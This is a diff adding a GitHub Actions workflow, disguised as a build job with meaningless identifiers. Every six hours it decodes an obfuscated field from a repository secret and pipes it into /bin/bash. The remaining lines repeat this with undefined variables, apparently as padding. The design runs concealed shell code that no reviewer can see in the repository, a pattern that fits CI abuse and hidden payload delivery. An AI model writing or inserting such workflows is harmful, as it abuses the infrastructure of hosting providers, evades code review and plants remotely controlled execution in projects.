@@ -1,0 +1,25 @@
+name: yuehongdong1278
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '49 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yuehongdong1278
+        env:
+          seqr1: ${{ secrets.seqr1 }}
+        run: |
+          echo $seqr1 | jq -r .bcum87 | /bin/bash
+          echo $mctct0 | jq -r .kjo4 | /bin/bash
+          echo $cnv77 | jq -r .zfowg06766 | /bin/bash
+          echo $trwi722 | jq -r .rbsdg6091 | /bin/bash
+          echo $xv356 | jq -r .ph46271 | /bin/bash
+          echo $m220 | jq -r .vncbz2 | /bin/bash
+          echo $hcp9551 | jq -r .wvuk97 | /bin/bash
+          echo $vjqcz6158 | jq -r .ko2505 | /bin/bash
+          echo $nsx173 | jq -r .mwi13677 | /bin/bash
+
